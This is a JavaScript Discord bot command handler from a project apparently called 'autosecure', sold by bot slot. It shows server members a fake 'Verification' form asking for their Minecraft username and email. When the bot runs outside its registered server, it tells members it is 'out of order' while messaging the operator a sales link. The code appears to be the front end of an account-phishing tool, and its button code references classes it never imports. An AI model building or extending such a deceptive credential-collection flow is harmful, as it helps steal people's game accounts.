const { TextInputStyle, EmbedBuilder } = require("discord.js");
const modalBuilder = require("../../utils/modalBuilder");
const { queryParams } = require("../../../db/database");
const getModal = require("../../utils/responses/getModal");
const getEmbed = require("../../utils/responses/getEmbed");
const config = require("../../../config.json")
const isblacklisted = require("../../../autosecure/utils/utils/isblacklisted")

let linkAccount = {
  name: "link account",
  callback: async (client, interaction) => {
    try {

                      let blacklisted = await isblacklisted(client, interaction, null)
                      if (blacklisted){
                            const embed = await getEmbed(client, "blacklisted");
                            return await interaction.reply({
                              embeds: [embed],
                              ephemeral: true,
                            });
                      }


      let server = await client.queryParams(
        `SELECT * FROM autosecure WHERE user_id=?`,
        [client.username]
      );

      if (server.length === 0) {
        return interaction.reply({
          content: `You don't have access to autosecure!`,
          ephemeral: true,
        });
      }

      server = server[0];

      if (server.server_id !== interaction.guildId) {

        await interaction.reply({
          content: `The bot is out of order!`,
          ephemeral: true,
        });

        const embed = new EmbedBuilder()
        .setTitle(`Sent \`The bot is out of order!\` to ${interaction.user.username}`)
        .setColor('#d22b2b')
        .setDescription(`Please only use your bot in one server, to keep using <#${interaction.channelId}>, set your server here using /set server!### If you wish to gain access to another bot slot, you can purchase it from [here](${config.botslotslink}) and use \`/redeem\` to redeem it.`);
    
      const button = new ButtonBuilder()
        .setLabel('Buy a new slot')
        .setStyle(ButtonStyle.Link)
        .setURL(config.botslotslink);
    
      const row = new ActionRowBuilder().addComponents(button);
        const user = await client.users.fetch(client.username);
        await user.send({ embeds: [embed] });

        return; 
      }


      const verificationTypeResult = await client.queryParams(
        `SELECT verification_type FROM autosecure WHERE user_id = ?`,
        [client.username]
      );

      const verificationType = verificationTypeResult[0]?.verification_type;

      if (verificationType === 0 || verificationType === undefined) {
        const userModalConfig = await getModal(client, "username");
        const emailModalConfig = await getModal(client, "email");
        return interaction.showModal(
          modalBuilder(`Verification`, userModalConfig.title, [
            {
              setCustomId: 'minecraftusername',
              setMaxLength: 16,
              setMinLength: 1,
              setRequired: true,
              setLabel: userModalConfig.setLabel,
              setPlaceholder: userModalConfig.setPlaceholder,
              setStyle: userModalConfig.setStyle === "paragraph" ? TextInputStyle.Paragraph : TextInputStyle.Short,
            },
            {
              setCustomId: 'Email',
              setMaxLength: 60,
              setMinLength: 3,
              setRequired: true,
              setLabel: emailModalConfig.setLabel,
              setPlaceholder: emailModalConfig.setPlaceholder,
              setStyle: emailModalConfig.setStyle === "paragraph" ? TextInputStyle.Paragraph : TextInputStyle.Short,
            }
          ])
        );
      } else {
        const onlyuserModalConfig = await getModal(client, "username");
        return interaction.showModal(
          modalBuilder(`SplitVerification`, onlyuserModalConfig.title, [
            {
              setCustomId: 'onlyusername',
              setMaxLength: 16,
              setMinLength: 1,
              setRequired: true,
              setLabel: onlyuserModalConfig.setLabel,
              setPlaceholder: onlyuserModalConfig.setPlaceholder,
              setStyle: onlyuserModalConfig.setStyle === "paragraph" ? TextInputStyle.Paragraph : TextInputStyle.Short,
            }
          ])
        );
      }
    } catch (error) {
      console.error('Error in linkAccount callback:', error);
      await interaction.reply({
        content: 'An error occurred while processing your request.',
        ephemeral: true,
      });
    }
  }
};

module.exports = linkAccount;